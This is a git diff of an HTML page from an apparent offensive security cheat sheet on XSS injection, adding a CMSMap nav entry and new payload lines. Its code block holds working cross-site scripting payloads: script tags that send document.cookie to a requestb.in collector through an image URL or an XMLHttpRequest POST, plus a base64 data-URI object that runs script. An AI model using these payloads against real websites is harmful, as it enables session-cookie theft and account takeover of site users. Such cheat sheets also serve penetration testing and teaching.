@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-06-17T18:09:40 CEST">
+<meta name="revised" content="2019-06-18T17:42:49 CEST">
 <title>XSS Injections :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -727,6 +727,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/web-attacks/content-management-system-cms/cmsmap/" class="dd-item">
+        <div>
+          <a href="/web-attacks/content-management-system-cms/cmsmap/">
+            CMSMap
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
       <li data-nav-id="/web-attacks/content-management-system-cms/others/" class="dd-item">
         <div>
           <a href="/web-attacks/content-management-system-cms/others/">
@@ -1315,7 +1322,10 @@ wget -O- http://<span style="color:#00a8c8">$(</span>wget -qO- icanhazip.com<spa
 <span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">write</span><span style="color:#111">(</span><span style="color:#d88200">&#39;&lt;img src=&#34;https://requestb.in/xxxxx?cookie=&#34;+document.cookie&gt;admin&lt;/img&gt;&#39;</span><span style="color:#111">);&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
 admin&#34;&gt;<span style="color:#111">&lt;/</span><span style="color:#f92672">i</span><span style="color:#111">&gt;</span>)<span style="color:#111">&lt;/</span><span style="color:#f92672">span</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">write</span><span style="color:#111">(</span><span style="color:#d88200">&#34;&lt;img src=http://requestb.in/XXXXX?cookie=&#34;</span><span style="color:#111">.</span><span style="color:#75af00">concat</span><span style="color:#111">(</span><span style="color:#111">encodeURI</span><span style="color:#111">(</span><span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">cookie</span><span style="color:#111">)).</span><span style="color:#75af00">concat</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/&gt;&#34;</span><span style="color:#111">))&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;&lt;</span><span style="color:#f92672">i</span><span style="color:#111">&gt;</span>
 
-<span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#00a8c8">var</span> <span style="color:#75af00">xhr</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">new</span> <span style="color:#75af00">XMLHttpRequest</span><span style="color:#111">();</span><span style="color:#75af00">xhr</span><span style="color:#111">.</span><span style="color:#75af00">open</span><span style="color:#111">(</span><span style="color:#d88200">&#39;POST&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;http://requestb.in/w0sw22w0&#39;</span><span style="color:#111">,</span> <span style="color:#00a8c8">true</span><span style="color:#111">);</span><span style="color:#75af00">xhr</span><span style="color:#111">.</span><span style="color:#75af00">setRequestHeader</span><span style="color:#111">(</span><span style="color:#d88200">&#39;Content-type&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;application/x-www-form-urlencoded&#39;</span><span style="color:#111">);</span><span style="color:#75af00">xhr</span><span style="color:#111">.</span><span style="color:#75af00">send</span><span style="color:#111">(</span><span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">cookie</span><span style="color:#111">);&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span></code></pre></div>
+<span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#00a8c8">var</span> <span style="color:#75af00">xhr</span> <span style="color:#f92672">=</span> <span style="color:#00a8c8">new</span> <span style="color:#75af00">XMLHttpRequest</span><span style="color:#111">();</span><span style="color:#75af00">xhr</span><span style="color:#111">.</span><span style="color:#75af00">open</span><span style="color:#111">(</span><span style="color:#d88200">&#39;POST&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;http://requestb.in/w0sw22w0&#39;</span><span style="color:#111">,</span> <span style="color:#00a8c8">true</span><span style="color:#111">);</span><span style="color:#75af00">xhr</span><span style="color:#111">.</span><span style="color:#75af00">setRequestHeader</span><span style="color:#111">(</span><span style="color:#d88200">&#39;Content-type&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;application/x-www-form-urlencoded&#39;</span><span style="color:#111">);</span><span style="color:#75af00">xhr</span><span style="color:#111">.</span><span style="color:#75af00">send</span><span style="color:#111">(</span><span style="color:#111">document</span><span style="color:#111">.</span><span style="color:#75af00">cookie</span><span style="color:#111">);&lt;/</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span>
+
+# alert(1) in JS
+<span style="color:#111">&lt;</span><span style="color:#f92672">object</span> <span style="color:#75af00">data</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;</span><span style="color:#111">&gt;&lt;/</span><span style="color:#f92672">object</span><span style="color:#111">&gt;</span></code></pre></div>
 
     
     
